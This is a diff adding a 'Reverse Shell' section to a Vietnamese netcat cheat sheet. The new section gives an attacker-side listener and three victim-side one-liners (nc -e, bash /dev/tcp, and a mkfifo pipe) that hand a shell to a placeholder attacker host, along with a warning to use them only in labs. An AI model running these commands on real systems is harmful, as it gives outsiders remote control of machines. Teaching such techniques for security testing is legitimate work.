@@ -80,6 +80,23 @@ mkfifo /tmp/pipe
 nc -l 8888 < /tmp/pipe | nc target_host 80 > /tmp/pipe
 ```
 
+### 8. Reverse Shell — Điều khiển máy chủ từ xa
+```bash
+# Terminal 1 — Trên máy Attacker (mở port lắng nghe)
+nc -l 4444
+
+# Terminal 2 — Trên máy Victim (chạy bash và đẩy I/O về attacker)
+# Cách 1: dùng nc -e (thường bị vô hiệu hóa vì lý do bảo mật)
+nc attacker_ip 4444 -e /bin/bash
+
+# Cách 2: dùng bash/dev/tcp (không cần dùng nc trên victim)
+bash -i >& /dev/tcp/attacker_ip/4444 0>&1
+
+# Cách 3: dùng mkfifo (nếu máy victim chỉ có nc truyền thống)
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f
+```
+> **Cảnh báo:** Đây là kỹ thuật thường được dùng bởi hacker để chiếm quyền điều khiển. Dùng trong lab/testing bảo mật hoặc khi bị kẹt không có SSH.
+
 ---
 
 ## 🔍 Kịch bản thực chiến
